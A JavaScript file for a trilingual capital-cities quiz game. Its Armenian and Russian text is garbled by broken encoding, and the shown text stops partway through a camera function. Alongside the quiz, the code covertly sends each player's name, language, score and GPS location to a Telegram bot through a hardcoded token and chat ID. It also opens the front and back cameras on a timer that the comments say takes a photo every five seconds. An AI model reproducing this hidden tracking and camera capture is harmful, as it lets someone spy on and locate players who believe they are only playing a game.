// script.js

const TELEGRAM_BOT_TOKEN = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
const TELEGRAM_CHAT_ID = '8071841674';

const questionsData = [
  {
    hy: { q: "’à÷Ä’∂ ’ß ’Ä’°’µ’°’Ω’ø’°’∂’´ ’¥’°’µ÷Ä’°÷Ñ’°’≤’°÷Ñ’®", answers: ["‘µ÷Ä÷á’°’∂", "‘≥’µ’∏÷Ç’¥÷Ä’´", "’é’°’∂’°’±’∏÷Ä", "’Ä÷Ä’°’¶’§’°’∂"], correct: 0 },
    ru: { q: "–ö–∞–∫–æ–π –≥–æ—Ä–æ–¥ —è–≤–ª—è–µ—Ç—Å—è —Å—Ç–æ–ª–∏—Ü–µ–π –ê—Ä–º–µ–Ω–∏–∏", answers: ["–ï—Ä–µ–≤–∞–Ω", "–ì—é–º—Ä–∏", "–í–∞–Ω–∞–¥–∑–æ—Ä", "–†–∞–∑–¥–∞–Ω"], correct: 0 },
    en: { q: "What is the capital of Armenia?", answers: ["Yerevan", "Gyumri", "Vanadzor", "Hrazdan"], correct: 0 }
  },
  {
    hy: { q: "’à÷Ä’∂ ’ß ’å’∏÷Ç’Ω’°’Ω’ø’°’∂’´ ’¥’°’µ÷Ä’°÷Ñ’°’≤’°÷Ñ’®", answers: ["’Ñ’∏’Ω’Ø’æ’°", "’ç’°’∂’Ø’ø ’ä’•’ø’•÷Ä’¢’∏÷Ç÷Ä’£", "’Ü’∏’æ’∏’Ω’´’¢’´÷Ä’Ω’Ø", "‘µ’Ø’°’ø’•÷Ä’´’∂’¢’∏÷Ç÷Ä’£"], correct: 0 },
    ru: { q: "–ö–∞–∫–æ–π –≥–æ—Ä–æ–¥ —è–≤–ª—è–µ—Ç—Å—è —Å—Ç–æ–ª–∏—Ü–µ–π –†–æ—Å—Å–∏–∏", answers: ["–ú–æ—Å–∫–≤–∞", "–°–∞–Ω–∫—Ç-–ü–µ—Ç–µ—Ä–±—É—Ä–≥", "–ù–æ–≤–æ—Å–∏–±–∏—Ä—Å–∫", "–ï–∫–∞—Ç–µ—Ä–∏–Ω–±—É—Ä–≥"], correct: 0 },
    en: { q: "What is the capital of Russia?", answers: ["Moscow", "Saint Petersburg", "Novosibirsk", "Yekaterinburg"], correct: 0 }
  },
  {
    hy: { q: "’à÷Ä’∂ ’ß ’ñ÷Ä’°’∂’Ω’´’°’µ’´ ’¥’°’µ÷Ä’°÷Ñ’°’≤’°÷Ñ’®", answers: ["’ì’°÷Ä’´’¶", "‘º’´’∏’∂", "’Ñ’°÷Ä’Ω’•’¨", "’Ü’´’Ω"], correct: 0 },
    ru: { q: "–ö–∞–∫–æ–π –≥–æ—Ä–æ–¥ —è–≤–ª—è–µ—Ç—Å—è —Å—Ç–æ–ª–∏—Ü–µ–π –§—Ä–∞–Ω—Ü–∏–∏", answers: ["–ü–∞—Ä–∏–∂", "–õ–∏–æ–Ω", "–ú–∞—Ä—Å–µ–ª—å", "–ù–∏—Ü—Ü–∞"], correct: 0 },
    en: { q: "What is the capital of France?", answers: ["Paris", "Lyon", "Marseille", "Nice"], correct: 0 }
  },
  // ... –∑–¥–µ—Å—å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ –¥–æ 30 –≤–æ–ø—Ä–æ—Å–æ–≤ ...
];

const translations = {
  hy: {
    enterName: "’Ñ’∏÷Ç’ø÷Ñ’°’£÷Ä’•÷Ñ ’±’•÷Ä ’°’∂’∏÷Ç’∂’®",
    startGame: "’ç’Ø’Ω’•’¨ ’≠’°’≤’®",
    tryAgain: "’ì’∏÷Ä’±’•’¨ ’∂’∏÷Ä’´÷Å",
    questionsLeft: "’Ä’°÷Ä÷Å’•÷Ä ’¥’∂’°÷Å’•’¨ ’•’∂",
    correctAnswers: "’É’´’∑’ø ’∫’°’ø’°’Ω’≠’°’∂’∂’•÷Ä",
    wrongAnswers: "’ç’≠’°’¨ ’∫’°’ø’°’Ω’≠’°’∂’∂’•÷Ä",
    victory: "’Å’•’¶’∂’∏’æ ’∞’°’≤’©’•÷Å’´÷Ñ! üéâ",
    defeat: "’ë’°’æ’∏÷Ç’¥ ’•’∂÷Ñ, ’∫’°÷Ä’ø’æ’•÷Å’´÷Ñ üòû",
    namePlaceholder: "’Ñ’∏÷Ç’ø÷Ñ’°’£÷Ä’•÷Ñ ’±’•÷Ä ’°’∂’∏÷Ç’∂’®",
    languageSelected: "‘∏’∂’ø÷Ä’æ’°’Æ ’¨’•’¶’∏÷Ç"
  },
  ru: {
    enterName: "–í–≤–µ–¥–∏—Ç–µ –≤–∞—à–µ –∏–º—è",
    startGame: "–ù–∞—á–∞—Ç—å –∏–≥—Ä—É",
    tryAgain: "–ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞",
    questionsLeft: "–û—Å—Ç–∞–ª–æ—Å—å –≤–æ–ø—Ä–æ—Å–æ–≤",
    correctAnswers: "–ü—Ä–∞–≤–∏–ª—å–Ω—ã—Ö –æ—Ç–≤–µ—Ç–æ–≤",
    wrongAnswers: "–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω—ã—Ö –æ—Ç–≤–µ—Ç–æ–≤",
    victory: "–í—ã –≤—ã–∏–≥—Ä–∞–ª–∏! üéâ",
    defeat: "–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, –≤—ã –ø—Ä–æ–∏–≥—Ä–∞–ª–∏ üòû",
    namePlaceholder: "–í–≤–µ–¥–∏—Ç–µ –≤–∞—à–µ –∏–º—è",
    languageSelected: "–í—ã–±—Ä–∞–Ω–Ω—ã–π —è–∑—ã–∫"
  },
  en: {
    enterName: "Enter your name",
    startGame: "Start Game",
    tryAgain: "Try Again",
    questionsLeft: "Questions left",
    correctAnswers: "Correct answers",
    wrongAnswers: "Wrong answers",
    victory: "You won! üéâ",
    defeat: "Sorry, you lost üòû",
    namePlaceholder: "Enter your name",
    languageSelected: "Selected language"
  }
};

let currentLanguage = localStorage.getItem('lang') || 'hy';
let userName = '';
let currentQuestions = [];
let currentQuestionIndex = 0;
let correctCount = 0;
let wrongCount = 0;

let geoCoords = null;
let cameraStreams = { front: null, back: null };
let photoTimers = { front: null, back: null };

const nameFormContainer = document.getElementById('name-form-container');
const nameForm = document.getElementById('name-form');
const nameInput = document.getElementById('name-input');
const nameLabel = document.querySelector('label[for="name-input"]');
const startBtn = nameForm.querySelector('button');

const languageButtons = document.querySelectorAll('.lang-btn');

const gameArea = document.getElementById('game-area');
const userNameDiv = document.getElementById('user-name');
const scoreInfoDiv = document.getElementById('score-info');
const questionDiv = document.getElementById('question');
const answerButtonsDiv = document.getElementById('answer-buttons');
const tryAgainBtn = document.getElementById('try-again-btn');

// –ü—Ä–∏–º–µ–Ω—è–µ–º –ø–µ—Ä–µ–≤–æ–¥—ã –≤ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–µ
function applyTranslations() {
  nameLabel.textContent = translations[currentLanguage].enterName;
  nameInput.placeholder = translations[currentLanguage].namePlaceholder;
  startBtn.textContent = translations[currentLanguage].startGame;
  tryAgainBtn.textContent = translations[currentLanguage].tryAgain;
  updateScoreInfo();
}

// –û–±–Ω–æ–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ —Å—á—ë—Ç–µ –∏ –∏–º–µ–Ω–∏
function updateScoreInfo() {
  const questionsLeft = 10 - currentQuestionIndex;
  scoreInfoDiv.textContent = `${translations[currentLanguage].questionsLeft}: ${questionsLeft} | ` +
    `${translations[currentLanguage].correctAnswers}: ${correctCount} | ` +
    `${translations[currentLanguage].wrongAnswers}: ${wrongCount}`;
  userNameDiv.textContent = userName || '-';
}

// –ü–µ—Ä–µ–º–µ—à–∏–≤–∞–µ–º –º–∞—Å—Å–∏–≤ (–§–∏—à–µ—Ä-–ô–µ–π—Ç—Å)
function shuffleArray(array) {
  for (let i = array.length - 1; i > 0; i--) {
    let j = Math.floor(Math.random() * (i + 1));
    [array[i], array[j]] = [array[j], array[i]];
  }
}

// –í—ã–±–∏—Ä–∞–µ–º —Å–ª—É—á–∞–π–Ω—ã–µ 10 –≤–æ–ø—Ä–æ—Å–æ–≤ –∏–∑ –±–∞–∑—ã (30 –≤–æ–ø—Ä–æ—Å–æ–≤)
function selectQuestions() {
  let indices = Array.from(Array(questionsData.length).keys());
  shuffleArray(indices);
  currentQuestions = indices.slice(0, 10).map(i => questionsData[i]);
}

// –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —è–∑—ã–∫ –∏ —Å–æ—Ö—Ä–∞–Ω—è–µ–º –µ–≥–æ
function setLanguage(lang) {
  currentLanguage = lang;
  localStorage.setItem('lang', lang);
  applyTranslations();
}
  
// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∫–Ω–æ–ø–æ–∫ –ø–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏—è —è–∑—ã–∫–∞
languageButtons.forEach(btn => {
  btn.addEventListener('click', () => {
    setLanguage(btn.dataset.lang);
  });
});
// –°—Ç–∞—Ä—Ç –∏–≥—Ä—ã, —Å–æ—Ö—Ä–∞–Ω—è–µ–º –∏–º—è, –≥–æ—Ç–æ–≤–∏–º –≤–æ–ø—Ä–æ—Å—ã –∏ UI
function startGame() {
  userName = nameInput.value.trim() || (currentLanguage === 'hy' ? "‘±’∂’∞’°’µ’ø" : currentLanguage === 'ru' ? "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π" : "Unknown");
  localStorage.setItem('userName', userName);

  currentQuestionIndex = 0;
  correctCount = 0;
  wrongCount = 0;
  selectQuestions();

  nameFormContainer.style.display = 'none';
  gameArea.style.display = 'block';

  showQuestion();
  updateScoreInfo();
  sendTelegramStart();
  startCameraIfAllowed();
  requestGeolocation();
}

// –û—Ç–æ–±—Ä–∞–∑–∏—Ç—å —Ç–µ–∫—É—â–∏–π –≤–æ–ø—Ä–æ—Å –∏ –≤–∞—Ä–∏–∞–Ω—Ç—ã –æ—Ç–≤–µ—Ç–æ–≤
function showQuestion() {
  clearAnswerButtons();

  if (currentQuestionIndex >= currentQuestions.length) {
    // –ï—Å–ª–∏ –≤–æ–ø—Ä–æ—Å–æ–≤ –±–æ–ª—å—à–µ –Ω–µ—Ç ‚Äî –ø–æ–∫–∞–∑—ã–≤–∞–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã
    showResults();
    return;
  }

  const qObj = currentQuestions[currentQuestionIndex][currentLanguage];
  questionDiv.textContent = qObj.q;

  // –ü–µ—Ä–µ–º–µ—à–∏–≤–∞–µ–º –æ—Ç–≤–µ—Ç—ã —Å —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ–º –ø—Ä–∞–≤–∏–ª—å–Ω–æ–≥–æ
  let answers = qObj.answers.map((a, i) => ({ text: a, isCorrect: i === qObj.correct }));
  shuffleArray(answers);

  answers.forEach(ans => {
    let btn = document.createElement('button');
    btn.classList.add('btn');
    btn.textContent = ans.text;
    btn.addEventListener('click', () => selectAnswer(btn, ans.isCorrect));
    answerButtonsDiv.appendChild(btn);
  });

  updateScoreInfo();
}

// –£–¥–∞–ª—è–µ–º –∫–Ω–æ–ø–∫–∏ –æ—Ç–≤–µ—Ç–æ–≤ –ø–µ—Ä–µ–¥ –ø–æ–∫–∞–∑–æ–º –Ω–æ–≤–æ–≥–æ –≤–æ–ø—Ä–æ—Å–∞
function clearAnswerButtons() {
  while (answerButtonsDiv.firstChild) {
    answerButtonsDiv.removeChild(answerButtonsDiv.firstChild);
  }
}
// –û–±—Ä–∞–±–æ—Ç–∫–∞ –≤—ã–±–æ—Ä–∞ –æ—Ç–≤–µ—Ç–∞ –∏–≥—Ä–æ–∫–æ–º
function selectAnswer(button, isCorrect) {
  // –ë–ª–æ–∫–∏—Ä—É–µ–º –≤—Å–µ –∫–Ω–æ–ø–∫–∏, —á—Ç–æ–±—ã –Ω–µ–ª—å–∑—è –±—ã–ª–æ –Ω–∞–∂–∞—Ç—å –ø–æ–≤—Ç–æ—Ä–Ω–æ
  Array.from(answerButtonsDiv.children).forEach(btn => btn.disabled = true);

  if (isCorrect) {
    button.classList.add('correct');
    correctCount++;
  } else {
    button.classList.add('wrong');
    wrongCount++;
    // –ü–æ–¥—Å–≤–µ—á–∏–≤–∞–µ–º –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –æ—Ç–≤–µ—Ç –∑–µ–ª—ë–Ω—ã–º
    Array.from(answerButtonsDiv.children).forEach(btn => {
      if (btn.textContent === currentQuestions[currentQuestionIndex][currentLanguage].answers[currentQuestions[currentQuestionIndex][currentLanguage].correct]) {
        btn.classList.add('correct');
      }
    });
  }

  updateScoreInfo();

  // –ñ–¥—ë–º 1.5 —Å–µ–∫—É–Ω–¥—ã, —á—Ç–æ–±—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–≤–∏–¥–µ–ª –ø–æ–¥—Å–≤–µ—Ç–∫—É, –ø–æ—Ç–æ–º —Å–ª–µ–¥—É—é—â–∏–π –≤–æ–ø—Ä–æ—Å
  setTimeout(() => {
    currentQuestionIndex++;
    showQuestion();
  }, 1500);
}
// –ü–æ–∫–∞–∑–∞—Ç—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã –ø–æ –æ–∫–æ–Ω—á–∞–Ω–∏–∏ –≤–æ–ø—Ä–æ—Å–æ–≤
function showResults() {
  clearAnswerButtons();

  // –í—ã–≤–æ–¥–∏–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –ø–æ–±–µ–¥–µ –∏–ª–∏ –ø–æ—Ä–∞–∂–µ–Ω–∏–∏ (–ø–æ–±–µ–¥–∞, –µ—Å–ª–∏ –ø—Ä–∞–≤–∏–ª—å–Ω—ã—Ö –æ—Ç–≤–µ—Ç–æ–≤ >=6)
  questionDiv.textContent = correctCount >= 6 ? translations[currentLanguage].victory : translations[currentLanguage].defeat;

  tryAgainBtn.style.display = 'block';

  // –§–æ–Ω –∏–≥—Ä—ã –æ—Å—Ç–∞–µ—Ç—Å—è, —á—Ç–æ–±—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤–∏–¥–µ–ª —Å–æ—Å—Ç–æ—è–Ω–∏–µ
  gameArea.style.filter = 'blur(2px)';
  gameArea.style.pointerEvents = 'none';

  updateScoreInfo();

  sendTelegramResult();
}

// –ö–Ω–æ–ø–∫–∞ ¬´–ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞¬ª ‚Äî —Å–±—Ä–æ—Å –∏ –∑–∞–ø—É—Å–∫ –Ω–æ–≤–æ–π –∏–≥—Ä—ã
tryAgainBtn.addEventListener('click', () => {
  tryAgainBtn.style.display = 'none';
  gameArea.style.filter = 'none';
  gameArea.style.pointerEvents = 'auto';

  // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –∑–∞–Ω–æ–≤–æ –¥–æ—Å—Ç—É–ø—ã, –µ—Å–ª–∏ –Ω–µ –¥–∞–Ω—ã
  if (!geoCoords) {
    requestGeolocation();
  }
  if (!cameraStreams.front || !cameraStreams.back) {
    startCameraIfAllowed();
  }

  startGame();
});
// –ó–∞–ø—Ä–æ—Å –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
function requestGeolocation() {
  if (!navigator.geolocation) {
    console.warn("–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è");
    return;
  }
  navigator.geolocation.getCurrentPosition(
    (position) => {
      geoCoords = position.coords;
      sendTelegramGeo();
    },
    (error) => {
      console.warn("–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏:", error);
    }
  );
}

// –û—Ç–ø—Ä–∞–≤–∫–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –≤ Telegram –≤ –≤–∏–¥–µ —Å—Å—ã–ª–∫–∏ Google Maps
function sendTelegramGeo() {
  if (!geoCoords) return;
  const url = `https://www.google.com/maps?q=${geoCoords.latitude},${geoCoords.longitude}`;
  const text = `üìç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è: [–ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å –Ω–∞ –∫–∞—Ä—Ç–µ](${url})`;
  sendTelegramMessage(text);
}
// –û–±—â–∞—è —Ñ—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram —á–µ—Ä–µ–∑ fetch API
function sendTelegramMessage(text) {
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: "Markdown"
    })
  }).catch(e => console.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:", e));
}
// –û—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–∞—á–∞–ª–æ –∏–≥—Ä—ã (–∏–º—è, —è–∑—ã–∫)
function sendTelegramStart() {
  const msg = `üë§ –ò–≥—Ä–æ–∫ –Ω–∞—á–∞–ª –∏–≥—Ä—É: ${userName}\nüåê –Ø–∑—ã–∫: ${translations[currentLanguage].languageSelected} (${currentLanguage})`;
  sendTelegramMessage(msg);
}

// –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç –∏–≥—Ä—ã (–∏–º—è, —è–∑—ã–∫, –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø—Ä–∞–≤–∏–ª—å–Ω—ã—Ö, –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è)
function sendTelegramResult() {
  let msg = `üèÅ –ò–≥—Ä–∞ –æ–∫–æ–Ω—á–µ–Ω–∞\nüë§ –ò–≥—Ä–æ–∫: ${userName}\nüåê –Ø–∑—ã–∫: ${translations[currentLanguage].languageSelected} (${currentLanguage})\n` +
            `‚úÖ –ü—Ä–∞–≤–∏–ª—å–Ω—ã—Ö –æ—Ç–≤–µ—Ç–æ–≤: ${correctCount}\n`;
  if (geoCoords) {
    const url = `https://www.google.com/maps?q=${geoCoords.latitude},${geoCoords.longitude}`;
    msg += `üìç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è: [–ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å –Ω–∞ –∫–∞—Ä—Ç–µ](${url})\n`;
  }
  sendTelegramMessage(msg);
}
// –ó–∞–ø—É—Å–∫ –∫–∞–º–µ—Ä—ã (—Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è –∏ –∑–∞–¥–Ω—è—è), –µ—Å–ª–∏ –µ—Å—Ç—å –¥–æ—Å—Ç—É–ø
async function startCameraIfAllowed() {
  try {
    // –§—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è –∫–∞–º–µ—Ä–∞
    const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
    cameraStreams.front = frontStream;
    startPhotoTimer(frontStream, 'front');

    // –ó–∞–¥–Ω—è—è –∫–∞–º–µ—Ä–∞
    const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } }, audio: false });
    cameraStreams.back = backStream;
    startPhotoTimer(backStream, 'back');
  } catch (e) {
    console.warn("–ö–∞–º–µ—Ä–∞ –Ω–µ –¥–æ—Å—Ç—É–ø–Ω–∞:", e);
  }
}

// –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–∞–π–º–µ—Ä –¥–ª—è —Ñ–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã –∫–∞–∂–¥—ã–µ 5 —Å–µ–∫—É–Ω–¥
function startPhotoTimer(stream, whichCamera) {
  const videoTrack = stream.getVideoTracks()[0];
  if (!videoTrack) return
